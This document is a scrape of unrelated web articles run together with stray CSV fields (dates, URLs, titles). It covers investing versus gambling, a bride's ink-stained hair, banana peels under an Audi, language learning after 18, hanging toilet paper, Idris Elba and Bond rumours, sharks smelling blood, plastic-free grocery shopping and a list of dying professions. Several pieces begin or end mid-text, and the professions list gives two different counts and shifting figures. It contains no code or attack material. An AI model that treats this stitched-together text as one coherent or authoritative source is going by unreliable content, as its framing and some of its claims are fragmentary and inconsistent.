Stock investing, on the other hand, can be time-rewarding. Investors who purchase shares in companies that pay dividends are actually rewarded for their risked dollars. Companies pay you money regardless of what happens to your risk capital, as long as you hold onto their stock. Savvy investors realize that returns from dividends are a key component to making money in stocks over the long term.

Getting Information

Both stock investors and gamblers look to the past, studying historical performance and current behavior to improve their chances of making a winning move. Information is a valuable commodity in the world of gambling as well as stock investing. But there's a difference in the availability of information.

Stock and company information is readily available for public use. Company earnings, financial ratios, and management teams can be researched and studied, either directly or via research analyst reports, before committing capital. Stock traders who make hundreds of transactions a day can use the day's activities to help with future decisions.

In contrast, if you sit down at a blackjack table in Las Vegas, you have no information about what happened an hour, a day, or a week ago at that particular table. You may hear that the table is either hot or cold, but that information is not quantifiable.",Going All-In: Investing vs. Gambling,

Bride-to-be ruins hair just days before wedding with very simple mistake - and we've all done it

We've all been there. Your hair is getting in the way but you don't have a hair band handy.

So you twist it, wrap it into a bun and stick a pen through it to keep it in place. Most us do this without even sparing a thought for what could happen if it all goes wrong and the pen leaks.

A bride-to-be with platinum blonde hair learned her lesson on this one the hard way.

Just a week before her wedding , Daphne Martin took a pen out of her hair only to find it had left a massive inky blue patch over her blonde locks. Not ideal.

""I was working at Costco at the time, and I had put a pen into my messy ponytail,"" she told Allure . ""A coworker approached me and told me what had happened, and I was in complete shock.""

Fortunately, Daphne had previously trained as a hair stylist, so she was better placed than most of us to sort out the mishap.

She put her fiancé to work as her assistant and washed her hair in the kitchen sink before applying bleach to her hair.

""I washed the area, blew it out, and then applied bleach. Surprisingly enough, five minutes of bleach got that out of my extremely light hair. My hair was back to normal that day — even an hour later, thank goodness.""

It's seriously impressive that she managed to pull it off in just five minutes, but arguably having platinum hair actually made it easier to bleach out.

If she had darker hair, she could have ended up making the blue hair and surrounding area lighter and would then have had to blend it back in with another colour.

Luckily her hair was back to being perfectly platinum in time for the big day - but we're sure she'll think twice about pinning her hair up with a pen next tine.

Remember when all of your problems could be solved by throwing down a banana peel, causing your opponent to comically spin out behind you, leading you to victory and temporarily broken friendships? Well that was just Mario Kart, and now you’re an adult, but could it still work in real life?

The folks over at Hoonigan setup a real life banana peel traction test with a 2018 Audi RS5, to see just how effective the fruit skin could be at taking out a car.

They tried launching the car on the bananas, where there was the most impact on traction, as well as multiple, so many, skids through the small field of peels to see if there was any crippling impact on the car’s performance.

Spoiler alert, the banana peels were no match for the all-wheel drive, 1,633kg 444 horsepower performance car. While there was a little bit of a slip, it seems like you would need a lot more banana peels to foil your enemy’s dreams of victory and glory. It may also help if they’re in a powerful, rear-wheel drive car that’s much more likely to slip up.

You Must Learn a Language Before You’re 18 to Be Fluent, Research Says

India Irving Social Media Editor 8 June 2018 View

An online quiz has uncovered the magic number of language learning.

The data suggests that after the age of 18 most people can no longer learn a language fluently. The quiz was conceived as part of a new Boston College study led by Joshua Hartshorne. It promised to guess test-takers’ native language or dialect based on their answers to a series of questions. However, the real purpose of the quiz was to measure participants’ proficiency with complex grammar and see how this correlated to the age at which they learned English.

Almost 700,000 questionnaires later, answered by internet users from all over the world, the results were in. The majority of English speakers who were deemed fluent had learned the language no later than 18 years of age, and the earlier they started learning, the more proficiently they spoke in adult life. Previously, puberty was widely thought to be the cut-off point for the ‘critical period’ during which humans are able to fluidly acquire a language. Hartshorne’s research allots a few more years for people to up their language count.

Culture Trip spoke to 26-year-old Alex Rawlings, a British polyglot who speaks 15 languages to varying abilities, about the new data. Four of his ‘five best’ languages – English, Greek, German and Spanish – fall in line with the timetable pointed to by the research. However he did not begin learning his fifth fluent language, Russian, until he was 19.

‘It’s difficult to argue with the science but I think what’s important is what we do with this information,’ he tells us. ‘The data is saying that if we don’t learn a language by a certain age we’re screwed and that the younger we start, the better. So while we certainly shouldn’t be telling adults they can’t learn languages, because many adults can and do, if we really do think the ideal time for children to learn a language is by 18, then we need to start teaching them’.

Alex explains that he believes the way language is taught in British schools is focused too much on academics and lacks passion and practicality. ‘It’s not just another school subject, it’s an amazing tool that gives you access to the world.‘","You Must Learn a Language Before You’re 18 to Be Fluent, Research Says",

There Is A Right Way To Hang Toilet Paper - And It Could Save You A
Trip To The Doctor

",24/08/2018 12:00,https://www.shared.com/hang-toilet-paper/,"Tomato, tomato. I'm sure you pronounced those same two words differently.

Toilet paper hanging over, or under? Not quite the same, am I right?

The over-or-under debate has been around for as long as I can remember.

Turns out, the way you hang your toilet says a lot about your personality.

A study published in The Independent by Dr. Gilda Carle found that people who prefer to have their toilet paper hanging over, where the loose end is draped over the top, are more likely to have a dominant personality.

And people who position the roll under, where the loose end is hanging inside next to the wall, are more likely to be less assertive and more empathetic and easy going.

All that being said, there is actually a right way to hang a roll of toilet paper, and you'd benefit from changing the position if you've been doing it wrong.

Why There's Only One Right Way

The tribe has spoken (when I say tribe, I mean science) that hanging your toilet paper the wrong way can make people sick, lead to lawsuits, and worker's compensation payments.

A 2011 study by the University of Colorado discovered that even the cleanest public restrooms are covered in dangerous bacteria that could make you very sick.

Their findings identified 19 groups of bacteria on the doors, floors, soap dispenser, faucet handles, and toilets.

Simply touching any of these surfaces puts you at risk of getting sick, and the problem is that most people are not washing their hands properly to get rid of these dangerous bacteria strains.

I don't think anyone's surprised by that, but here's where things got interesting...

The researchers discovered a lot of e.coli, which comes from human feces, around the toilet.

This bacteria can easily be transferred to your hands, and cause health problems, like food poisoning.

So if the toilet paper is hung ""under,"" there's a chance that someone's fingers could come in contact with the wall. And because the toilet paper is closer to the wall, it brushes against it, and the next person's hands can get contaminated.

Also, when the toilet paper is hung under, someone's hands may come in contact with the top of the toilet paper as they're trying to rip out however much they need.

That's why hanging the toilet paper ""over"" is the right way.

A person's fingers would only be able to touch the toilet paper that they will use.

Now that you know this knowledge, it makes sense right? This is why many public restrooms have a toilet paper dispenser to restrict people from touching the whole roll.

According to Inc., employees have held their employers liable for food poisoning in the workplace.

And for good reason. In the worst cases, food poisoning can result in brain damage or death.

So what can you do to prevent yourself from getting sick, aside from letting coworkers know the right way to hang toilet paper?

Wash your hands properly for at least 20 seconds with warm water. And you might want to stay away from hand dryers.

Which way do you hang toilet paper? Share this story with your friends to let them know about these health risks.

Idris Elba Again Addresses Those James Bond Casting Rumors
Is the leading man in line to take on the beloved international spy?

Idris Elba is clearing the air when it comes to playing a certain martini-drinking, dapper-dressing British agent.

For years, it’s been speculated that the 45-year-old actor would soon step into the role of James Bond, though no official casting announcements have ever been made. Most recently, director Antoine Fuqua revealed to the Daily Star that he’s had discussions recently with EON Production’s Barbara Broccoli, who said “it is time” for a black actor to tackle the iconic character.

Unsurprisingly, this immediately had fans convinced that this was confirmation that Elba would be taking up the Bond mantle.

On Wednesday, a reporter with Good Morning Britain had Elba respond to the rumors by first inquiring if he was holding a martini and if it was shaken or stirred, referring to Bond's favorite cocktail. “Stir fried, actually,” Elba joked.

When straight-up asked if he'd be playing 007, the actor responded, “No.”

Elba's response comes after he tweeted earlier this month in response to the rumors, writing: “Don’t believe the HYPE.""

Back in 2016, Elba admitted on Good Morning America that he and the studio hadn’t even discussed the possibility of him playing Bond someday.

Don’t believe the HYPE... — Idris Elba (@idriselba) August 12, 2018

""If it was to happen it would be the will of the nation, because there's been no talks [between] me and the studio,"" he stated. ""If I'm really honest, I think I'm too old for that. I can't be running around in cars and ladies and martinis, who wants to do that? Sounds terrible.""

Story continues

MGM and EON Productions announced in 2017 that the 25th installment in the Bond franchise would be hitting U.S. theaters on Nov. 8, 2019. In May, the franchise’s most recent star, Daniel Craig, was confirmed to reprise the role.

Can A Shark Really Smell A Drop Of Blood From A Mile Away?

Shark's are rumored to have the amazing ability to smell blood from a mile...
",24/08/2018 9:00,https://www.ripleys.com/weird-news/sharks-smell-blood/,"Or Not In today’s world many misconceptions have been perpetuated—becoming modern day “facts”—when, in reality, myths and hearsay have taken over. Sorry to burst your bubble, but in this weekly column, Ripley’s puts those delusions to the test, turning your world upside down, because you can’t always…Believe It! Today: Can sharks smell blood from a mile away?

The Scent of Blood

Even though there’s just a 1 in 3.7 million chance of being killed by a shark, people are so fearful of the predators that they’ve developed myths about them—such as their ability to smell a tiny drop of blood from miles away.

While sharks do have a strong sense of smell, this statement is largely overblown. Some sharks can identify blood a quarter-mile away, but the scent doesn’t reach them instantaneously or necessarily cause them to attack.

Sharks have a heightened sense of smell and olfactory system that is hundreds of times stronger than a human’s. Their nostrils, located beneath their snouts, are used only for smelling and not for breathing. They do have the capacity to detect tiny amounts of various compounds in the water. Some types of sharks, such as the lemon shark, can even detect a scent in a large swimming pool or a substance that is several hundred meters away.

But a shark more than a quarter-mile away won’t smell your blood and decide to make you into a yummy snack. Smells reach a shark through the currents, and it would take time for the scent to travel that distance to a shark’s nostrils. The motion of the ocean carries smell molecules with it, so, the more motion, the faster the smell will travel.

If you do start to bleed while swimming in the ocean, there is some time to get safely to shore in case a rogue shark decides to attack.

Sharks really don’t like human meat and generally aren’t interested in the bodily fluids people excrete. “You can smell a landfill, but it won’t make you want to eat it,” noted Dr. Steve Kajiura of Florida Atlantic University’s Shark Lab.

The lemon shark, for example, can detect a small drop of blood in the water. But they are particular about what they eat. They enjoy munching on bony fish, mollusks, and crustaceans. Sometimes they will eat a seabird or a small shark. Humans are not on the menu.

Menstruating women can also relax. At most, a woman will secrete 80 ml of blood (around 6 tablespoons) and not all at once. To top it all off, according to National Geographic, 93 percent of shark attacks around the world between 1580 and 2010 were on males.

An average of 10 people die a year in shark attacks, which are usually the result of mistaken identity. Some types of sharks whose diet consists of sea lions and seals may bite a human to see what he or she tastes like. That test bite can be fatal because a shark’s numerous teeth can cause uncontrollable bleeding.

But when you get back and unpack the weekly shop, you might notice just how much plastic packaging you've acquired.

If you're concerned about the amount of plastic waste you're creating, you're not alone. A recent survey found that 92% of adults are concerned about plastic pollution and 78% are taking steps to reduce the single-use plastic they buy.

Don't know where to start? This guide will help you avoid plastic waste during your weekly supermarket trip.

The problem with plastic

It’s not hard to see why so many of us are worried about plastic pollution. Each year, the UK uses five million tonnes of plastic, and packaging accounts for almost half of this, according to Government figures. What’s more, roughly a third of all plastic used in packaging is single-use plastic produced by the UK’s top 10 supermarkets*.

Pressure on companies to reduce the amount of plastic they use has led to most of the UK’s leading supermarkets setting their own targets to reduce single-use plastic in the packaging of their own-brand products.

However, as the timeframes for meeting these targets vary considerably, what can shoppers do now to stem the tide of plastic when they shop for their groceries? And how easy is it to limit the plastic you take home when you do the weekly grocery shop?

We sent a member of our consumer team to do a mystery shop.

Is plastic-free shopping actually possible?

Armed with a shopping list of 32 commonly bought food products, including bread, cereal, ham and carrots, we headed to a branch of a leading supermarket to fill two trolleys – one with pre-packed and plastic-packaged goods, and the other with products packed in the least amount of plastic packaging possible.

To ensure we had access to a wide range of products and therefore the best possible chance of finding non-plastic-packaged food, we chose a larger, out-of-town superstore with a good selection of fresh food counters. These included hot and cold deli counters, fish and meat counters and an in-store bakery.

When we filled the second trolley, we opted for loose food items wherever possible (which we packed in our own reused paper bags and reusable food storage boxes) and hunted for food products in non-plastic packaging.

'Avoiding plastic requires legwork'

Even though we shopped in a large store, we only managed to find non-plastic-packaged alternatives for half of the 32 products on our list. For foods such as crisps, biscuits, breakfast cereal and bread – all of which risk going stale without the right packaging – the lack of a non-plastic-packaged alternative was unsurprising. But the availability of other products in anything other than plastic often seemed inconsistent.

We were able to buy fresh, unpackaged beef burgers from the meat counter and salmon fillets from the fish counter, but sausages were only available pre-packed. Fruit and veg such as broccoli, sweet peppers and bananas were all available to buy loose, but tomatoes, whole lettuces and oranges were not. Teabags couldn’t be bought without a covering of plastic film but this wasn’t used to package a box of loose leaf tea.

By opting for loose produce, buying from fresh food counters and seeking out alternatives to products packed in plastic, we managed to cut the number of pieces of single-use plastic waste generated by our shop by nearly 40%.

'Avoiding plastic in the supermarket is possible but requires a lot of legwork by the consumer,' says Emilie Martin, consumer affairs director at GH. 'And too often there just weren't the plastic-free alternatives there.'

Less plastic, but at a premium

For some products, while a non-plastic-packaged alternative was available, there was a premium to pay.

We bought 500g of own-brand easy-cook rice in a plastic packet for 80p, for example, but the same quantity in a cardboard packet cost £2.10. A 500ml plastic bottle of own-brand olive oil set us back £2.54, but the same quantity in a glass bottle cost £4.25. In both of these cases, there was no supermarket own-brand equivalent available in non-plastic packaging, so we had to opt for a branded product, which goes some way to explaining the difference in price.

Meanwhile, two pre-packed boneless salmon fillets cost £3.85, while the equivalent cost 85p more from the fresh fish counter. This meant that the total price of the items in our ‘non-plastic’ basket of goods was £3.50 dearer. This was largely due to there being such a limited range of non-plastic-packaged goods – especially own-brand goods – to choose from.

There was some good news, though. In the fruit and veg aisle, loose broccoli, baking potatoes and bananas worked out slightly cheaper than their pre-packed counterparts, and there was no price difference between loose and pre-packed brown onions or carrots. Branded honey in a glass jar was the same price as the same quantity of honey in a squeezy bottle and loose and pre-packed bread rolls and slices of honey roast ham were also identical in price. And when it came to buying instant coffee, every product was packaged in a glass jar, with the exception of one brand, which came in a tin.

What is your supermarket doing?

A survey by the Grocer found that around four in 10 of us are concerned about how much plastic packaging is used for our food and drink, and a third of 55-64 year olds do not think supermarkets have done enough to reduce plastic waste and provide sustainable alternatives.

To see if supermarkets have been putting their money where their mouths are, Greenpeace and the Environmental Investigation Agency ranked UK supermarkets according to the amount of widely recyclable plastic they use to package their own-brand products.

Out of the 10 leading supermarkets, Waitrose was ranked at #1 as they reported a big reduction in plastic use and a commitment to increasing the amount of reusable packaging they offer. Iceland came last and were ranked poorly for recycling and issues with supply chain.

Reuse and refill

As Covid introduced new safety concerns around loose food as well as increased financial hardship, it's easy to think that reducing plastic packaging has become less of a priority. However, a survey by FMCG found that 55% of people globally have become more concerned about the environment as a result of the pandemic.

Sustainability is clearly still a key issue for consumers. So what initiatives are supermarkets putting in place?

Before the pandemic started, Waitrose launched refill stations in several stores so customers can buy loose groceries, such as rice and pasta, in their own reusable containers. Tesco has introduced a similar service in 10 stores in east England. Sainsbury’s is replacing plastic fruit and veg bags in its stores with paper ones and Aldi is trialling paper and compostable carrier bags.

Environmental group Friends of the Earth reminds consumers tat reusing bags and refillable containers is always better than buying new ones — even if the new ones are made of sustainable materials.

‘Compostable bags are only compostable under certain conditions,’ explains FOE’s Carrie Hume. ‘And although paper bags can seem a better alternative than plastic, we still need to remember the high carbon footprint that comes from these when they’re only used once.'

We asked the three largest supermarkets what they were doing to tackle the problem of ‘avoidable’ plastic waste, which the Government describes as plastic that’s not recyclable, reusable or compostable and make a wider selection of their own-brand products available in non-plastic packaging.

What the retailers say

Tesco has acknowledged that 'for too long, packaging on consumer goods has been excessive'. It said it had already removed more than 4,000 tonnes of hard-to-recycle packaging from 800 of its own-brand products in 2019.

Meanwhile, Asda told us it had removed more than 6,500 tonnes of plastic packaging – equivalent to the weight of 600 million plastic bottles – from more than 1,000 of its own-brand lines in the past 18 months, either by removing packaging altogether or switching to an alternative material.

Sainsbury’s has a target to reduce our use of plastic packaging by 50% by 2025. The supermarket is part of the WRAP UK Plastic's Pact that promises to eliminate problematic plastics, reduce the total amount of packaging on shelves and increase recycling.

All three supermarkets have committed to halving their use of single-use plastic by 2025.

6 ways you can reduce supermarket plastic right now

Shop at a supermarket with a fresh meat and fish counter, if you can (or your local butcher and fishmonger), and take your own reusable packaging to bring food home in.

Always choose glass over plastic as it can be reused endlessly.

Buy cheese from the deli counter, if possible, and bring it home in a wax wrap, like this one.

Look for the Plastic Free Trust Mark (it guarantees there is no plastic in the packaging it appears on), which currently appears on more than 700 products, from eggs to coffee.

Find your nearest zero waste shops (where all food is bought loose, from cereal to spices and detergent) at Zero Waste Near Me.

16 Dying Professions You Should Avoid

The rise of automation threatens the viability of many jobs.
",23/08/2018 23:33,https://www.workandmoney.com/s/dying-professions-83f89af396e34d92,"35 Dying Professions You Should Avoid The rise of automation threatens the viability of many jobs.

35 Dying Professions You Should Avoid John Pugliano, author of ""The Robots Are Coming: A Human's Survival Guide to Profiting in the Age of Automation,"" sees plenty of white-collar jobs that will be threatened by automation. ""Bottom line, any routine job that can easily be defined by a mathematical or logic equation will be at risk,"" Pugliano said. ""Opportunity will be [there] for those that can create new products/services or solve/fix unexpected problems."" So your accountant may not have a job in the future, but plastic surgeons and emergency room doctors should do well. And plumbers, Pugliano said, will always have work. Pugliano and other experts contacted by Work + Money offered professions to avoid (not because they will completely disappear, but because the job market will likely be in a state of decline) while also providing alternatives where skills utilized in those dying professions can be applied for a more secure employment future.

Coal Miner 2020 median pay: $59,350

Bottom Line: Coal Miner As the United States shifts focus to more clean energy sources, coal mining jobs continue their downward spiral. In March and April 2020 alone, over 6,000 coal mining jobs were lost, and dozens of mines closed. The industry has suffered more job losses and mine closures than any other time in history. From 2012 to 2020 over half the coal mining jobs in the U.S. disappeared.

Taxi Driver 2020 median pay: $32,320

Bottom Line: Taxi Driver Apps like Uber and Lyft have made catching a ride easier than ever, even in places where taxis aren't the norm. And that doesn't bode well for traditional cabs. New York City, once known for its constant stream of yellow taxi medallions, saw 510 foreclosures of taxi medallion-backed loans in 2019 alone. That's not the only problem cab drivers face. Driverless cars, while not yet the norm, are the future.

Surveyors and Mapping Technicians 2020 median pay: $46,200

Bottom Line: Surveyors and Mapping Technicians There will always be some need for surveyors and mapping techs, as some positions are specialized and require an advanced degree, but there are others that only require a high school diploma. The profession will see a loss of over 4,000 jobs through 2024, due to robotics and other technological advancements. According to the U.S. Bureau of Labor Statistics, the openings that are available come from the need to replace workers who retire or leave the occupation altogether.

Parking Enforcement 2020 median pay: $ 44,870

Bottom Line: Parking Enforcement You may still see people handing out parking tickets every day, but that is a job that will likely be automated in the coming years. According to Recruiter.com, parking enforcement positions have been declining since about 2004 and have decreased by nearly 25 percent nationwide. There will be 2,360 jobs lost by 2029, which is a decrease of about 3 1/2 percent over the next few years.



However, that will not mean fewer tickets.

Prepress Technician 2020 median pay: $ 43,370

Bottom Line: Prepress Technician With print media on the decline and newspapers and magazines closing every day, prepress jobs are quickly vanishing. In 2019, the BLS announced a 5 percent decline in prepress jobs through 2029, due not only to the lack of print media, but also to automation in printing processes. Remember typesetting?

Restaurant Server 2020 median pay (waiters and waitresses): $ 27,470

Bottom Line: Restaurant Server COVID, difficult customers and low wages have made finding waitstaff difficult, but that is not the only thing that is causing a decline in restaurant workers. Robotics are also starting to play a part.



Restaurant consulting firm Aaron Allen & Associates said more than 80 percent of all positions in the industry could be automated, and of those, 37 percent of waitstaff will be affected. The company said the events of recent years have only made this more likely. ""This is just the tip of the iceberg for the industry. And while we’re not saying that every foodservice worker will be replaced with robots — nor suggesting whatsoever that the human element of service be removed — there are a lot of jobs that are ripe for disruption in the industry.""

Referee 2020 median pay (umpires, referees, and other sports officials): $ 40,140

Bottom Line: Referee Another job that's in jeopardy is refereeing. Video technology is more accurate than humans are and sports organizations like FIFA are already using it to regulate games.



As with restaurant jobs, COVID, low pay and abuse are keeping people from wanting to take on what was once an enjoyable profession. According to Business Insider, 75 percent of people leave the position within three years of taking it on.



CEO of Payball, Peter Makeover, said: ""When they don't get that sense of connection, it simply isn't worth their time.""

Herders and Wranglers 2020 median pay: $27,759

Bottom Line: Herders and Wranglers People, along with dogs and horses, have herded sheep and cattle for centuries, but these jobs may be ending sooner than you think. While there is still a need for wranglers and herders, drone technology can reach farther than humans can over more acreage. Drone technology allows farms to save money on monitoring cattle, particularly in hiring ranch hands or using helicopters.

Elevator Operator 2020 median pay: $41,000

Bottom Line: Elevator Operator Since 1950, the one job that has almost completely been made extinct is that of an elevator operator. They were essential in the days of manual elevator operation. Attendants knew how to run an elevator safely, as many users had no idea how to do it themselves. Advancement in elevator technology made them easy to operate for everyone and eliminated the need for a human attendant. While you still may see a few elevator operators here and there, today, they are mostly a novelty.

Air Traffic Controller 2020 median pay: $130,420

Bottom Line: Air Traffic Controller As you can imagine, being an air traffic controller is a highly stressful job, with no margin for error. Automation does make things safer, but the byproduct of that is fewer jobs for people.



While there will always likely be air traffic controller jobs, there is a decreased demand for them due to government budget constraints and the Next Generation Air Transportation System, which will transform air traffic control systems from radar to satellite through 2025. While the conversion will allow airports to handle more traffic, it will reduce the need for new hires at the same time.

Travel Agent 2020 median pay: $42,350 Note: Available median pay figures come from the Bureau of Labor Statistics (BLS), unless otherwise noted.

Bottom Line: Travel Agent Thanks to online travel booking sites, everyone is their own personal travel agent these days. The BLS projects that the number of travel agents will decline by 12 percent over the next 10 years. But travel agents may not completely die out. According to Skift, a global travel industry intelligence provider, ""the value-add that agents can bring to the travel experience will be difficult to obviate completely, either through disintermediation or automation."" There is also an alternative career on the rise. The Occupational Outlook Handbook predicts an increase in the need for people who are experts in specific destinations or particular types of travelers. That could include corporate, luxury, study abroad or travelers over 55.

Mortgage Brokers 2020 median pay: $58,304

Bottom Line: Mortgage Brokers The number of traditional mortgage brokers dropped by 80 percent during the Great Recession, and for those who were able to keep their jobs, average salaries dropped by 30 percent. And the profession hasn’t really recovered, thanks to online brokers like Rocket Mortgage and Guaranteed Rate that make getting an online quote quick, according to Timothy G. Wiedman, a retired professor of management and human resources at Doane University in Nebraska. Add in that millennials, the home buyers of the future, have grown up doing everything online, and the outlook for mortgage brokers looks bleak at best. ""However, many of the numeric and financial skills possessed by folks who might be attracted to that profession could be utilized elsewhere in the financial services industry,"" Wiedman said. ""So by earning different professional credentials, those folks won't starve."" The BLS doesn’t track mortgage brokers and has no projections for the future of the profession.

Bookkeeper 2020 median pay (bookkeeping, accounting and auditing clerks): $41,230

Bottom Line: Bookkeeper Blame artificial intelligence for the decline of the bookkeeping profession, says Dmytro Arshynov of DMA Financial Management LLC in New York. Sites like QuickBooks Online and Receipt Bank can automatically download your bank account information and prepare a simple Form 1040 and Schedule form. With the technology constantly improving, Arshynov believes the job of bookkeeping will be eliminated within a decade and replaced with automated technologies. The BLS projects just a 1 percent drop in the category of bookkeepers, accountants and auditing clerks from 2016 to 2026, but adds that ""technological change and automation are expected to reduce demand for these workers.""

Lawyer 2020 median pay: $126,930

Bottom Line: Lawyer The world will always have lawyers, but a lot of the work they do — or used to do — is quickly being taken over by technology. Pugliano notes that a lot of the work once done by case researchers can now be done with increasingly sophisticated algorithms. His recommendation for aspiring legal eagles is to focus on specializing in non-routine human emotion intense areas, like jury selection or witness profiling. The BLS has a different point of view about lawyers, projecting an 8 percent overall increase in jobs in the field by 2026.

Broadcasters 2020 median pay (reporters, correspondents and broadcast news analysts): $49,300

Bottom Line: Broadcasters One in 10 of the nation's 33,202 radio and television announcers are expected to see their jobs disappear by 2026. Consolidation in the industry, as well as increased use of syndicated content, is fueling the decline. There's also the explosion of streaming music services. More and more listeners prefer that over their local, drive-time disc jockey. The BLS projects a 9 percent decline in the category of reporters, correspondents and broadcast news analysts, with about 4,500 total jobs going away.

Middle Managers 2021 median pay: $75,246

Bottom Line: Middle Managers The paper-pushing done by middle managers is increasingly being done by enterprise software like Oracle and Salesforce. People in those jobs, Pugliano said, should focus on revenue-producing functions like client relationships, sales or new product development. The BLS doesn’t track middle managers as an employment category and thus has no projections.

Casino Cashier 2020 median pay (gaming service workers): $27,050

Bottom Line: Casino Cashier There are plenty of opportunities in gaming as more and more states legalize gambling, but cashier is not one of them. Casinos are increasingly turning to automated machines to reduce labor costs, meaning the man or woman in the casino cage is going the way of the one-armed-bandit-style slot machines. The growth in the industry is expected to fuel demand for dealers. But there is a downside: While the number of dealers is expected to grow by 8.7 percent over the next 10 years, they earn significantly less than cashiers ($19,552 per year versus $22,970). Overall, the BLS projects a 2 percent increase by 2026 in the category of gaming service workers, which is slower than average for all occupations.

IT Support 2020 median pay: $55,510

Bottom Line: IT Support Or, as they’re also known, system and server administrators. With so much of computing becoming cloud-based, the general IT person who patrolled your office is becoming less and less relevant in today's workforce, says Nicholas C. Fiorentino, chief executive at CrediReady. The change is already happening at smaller businesses, which find it cheaper and more efficient to outsource the work. ""The good news is, it is creating the opportunity for programmers, freelancers and system administrators willing to pivot to manage their client servers remotely and profitably, and at better scale,"" Fiorentino said. The BLS take on the category: ""Employment of network and computer systems administrators is projected to grow 6 percent by 2026, about as fast as the average for all occupations.""

Financial Planners 2020 median pay: $89,330

Bottom Line: Financial Planners Tasks once performed by low-level retail financial planners are quickly being outsourced to planning software, apps, robo-advisors and investing algorithms, Pugliano says. Investopedia puts it this way: ""Robo-advisors will also likely be employed by every firm in one capacity or another. In 10 years they will likely be able to follow very sophisticated strategies that employ a measure of judgment regarding buy and sell decisions."" Pugliano does see an opening in the future. ""[An] opportunity remains for those than can implement market-timing strategies along with asset protection and risk mitigation,"" he adds.

Floral Designers 2020 median pay: $29,140

Bottom Line: Floral Designers The number of flower arrangers fell 25.6 percent between 2005 and 2015 and is projected to fall another 16.6 percent between 2015 and 2025. Blame the internet and its burgeoning business of flower delivery, as well as a push by supermarkets to bolster their floral departments and sell loose flowers directly to customers. The visual design skills used by floral designers, however, are easily transferable to the higher-paying professions of interior design and merchandise display, both of which are growing.

Postal Workers 2020 median pay: $51,150

Bottom Line: Postal Workers The Bureau of Labor Statistics predicts the number of postal workers, including mail carriers and clerks, will drop by 28 percent by 2026. Online bill paying and keeping in touch with friends on social media are the biggest culprits in the dreary outlook for workers in the United States Postal Service. Mail sorters will be hardest hit, with a drop of 50 percent in available jobs, according to BLS. Yes, many online retailers use the postal service to deliver packages, but that demand doesn't make up fully for other areas of decline. According to the Occupational Outlook Handbook, ""Automated sorting systems, cluster mailboxes and tight budgets will adversely affect employment."" In 2017, the postal service delivered 149 billion pieces of mail, down from 212 billion a decade earlier. And if you think Amazon will save the U.S. Postal service, think again. The company is aggressively building out its own network of delivery drivers in an effort to reduce costs and increase the availability of same-day delivery to better compete with brick-and-mortar retailers.

Photo Processor 2020 median pay: $34,720

Bottom Line: Photo Processor Digital photography continues to make job hunting tough for people who work with film. There are just 23,853 photo processors remaining in the U.S., according to the Bureau of Labor Statistics, and their ranks are expected to decrease by 19.7 percent by 2026. Fear not, shutterbugs: The need for photographers is on the increase. That profession is expected to increase by 12 percent to 155,286 jobs by 2026. Portrait and commercial photographers — the people who take photos for businesses and advertising firms — are expected to see the greatest growth over the next decade.

Data Entry Clerks 2020 median pay: $38,100

Bottom Line: Data Entry Clerks These workers are expected to be the hardest hit in an overall decline in opportunities for the broader category of office and administrative workers. Once again, we can thank — or blame — technology. Word processing, voicemail and the internet mean we end up doing a lot of the tasks that once would have been delegated to an administrative assistant. The profession had actually been in decline for several years and then saw a rapid increase in decline during the recession. The economic recovery hasn't been applied to people in this line of work: 13,200 typists lost their jobs between 2010 and 2020, and 15,900 data entry clerks lost their jobs in the same time frame.



Data entry will decline by 25 percent through 2029.

Telephone Switchboard Operators 2020 median pay: $30,723

Bottom Line: Telephone Switchboard Operators Yes, there are still a few people who work as operators, but their numbers have been declining for decades and are projected to fall another 33 percent in the next 10 years. In 2020, there were just 109,300 people working as switchboard operators. Once again, blame technology. We even heard about an office that is using Amazon’s Alexa to direct phone calls to the right recipient. Texting, voice mail and other AI-enhanced systems could make this job obsolete even sooner than projected.

Farmer 2020 median pay (farmers, ranchers and other agricultural managers): $68,090

Bottom Line: Farmers The number of agricultural workers declined 8 percent from 2010 to 2020, according to the Bureau of Labor Statistics. It’s not because people are eating less, but because farmers are getting more efficient, replacing workers with machinery and getting bigger yields out of smaller plots of land. Still, with the world population expected to grow by 2.3 billion people by 2050, according to the United Nations, farming will remain a widespread and necessary profession.

Fast Food Cook 2020 median pay (cooks): $27,250

Bottom Line: Fast Food Cook The promise of technology is that it will make low-paying jobs obsolete. And nothing is more symbolic of the bottom of the employment food chain than fast food cook, which is one of the few jobs in our list that require less than a high school diploma. In 2020, there were 511,400 fast food cooks working in the U.S. down 3.6 percent from 2010. The reason? Fast food is increasingly becoming an automated industry. The chains have found it cheaper to prepare food off-site and simply have employees reheat it in their stores. That was unthinkable in most fast food businesses even a decade ago, but food technology has advanced to the point where the microwaved version doesn’t lack the flavor of the cooked-on-site version.

Newspaper Reporter 2020 median pay (reporters, correspondents and broadcast news analysts): $49,300

Bottom Line: Newspaper Reporter Given that circulation has been dropping for 17 straight years and Sunday circulation of the nation’s newspapers are at their lowest levels since 1945 — when there were significantly fewer people — and it's no wonder that the people who fill the paper with news are losing their jobs. Look for nearly one in 10 reporters to lose their jobs in the next 10 years, according to BLS.

Jeweler 2020 median pay (jewelers and precious stone and metal workers): $41,900

Bottom Line: Jeweler With more and more jewelry being produced overseas, there are fewer and fewer jewelers working in the U.S. BLS projects an 11 percent decline in the number of jewelers by 2024. A 2014 report from McKinsey & Company says of the jewelry industry: ""Consequential changes are under way, both in consumer behavior as well as in the industry itself. Jewelry players can’t simply do business as usual and expect to thrive; they must be alert and responsive to important trends and developments or else risk being left behind by more agile competitors.""

Textile Machine Workers 2020 median pay (pressers, textile, garment and related materials): $26,050

Bottom Line: Textile Machine Workers Another job that requires minimal education, the low-skilled machine working is increasingly being done overseas. The decline affects setters, operators and tenders of textile knitting and weaving machines. But workers who have slightly more specialized skills, like skilled manufacturers, are seeing a slight increase in the number of opportunities available to them. An even better option? Train to be a machinist. The number of people who use lathes, milling machines and grinders to make bolts and other parts are expected to see the number of available jobs grow by 12.9 percent by 2026. The BLS projects a 7 percent decline of jobs in the pressers, textile, garment and related materials category.

Furniture Finisher 2020 median pay: $59,500

Bottom Line: Furniture Finisher These craftspeople shape, finish and refinish damaged and worn furniture. But with furniture prices constantly declining it's now often cheaper to replace than it is to repair a broken chair or table. Furniture finishers who work in production — the making of new furniture — are no better off as the process becomes automated, moved overseas or both. BLS projects the number of furniture finishers to fall 0.7 percent to 20,113 by 2026.

Door-To-Door Salespeople 2020 median pay: $36,740

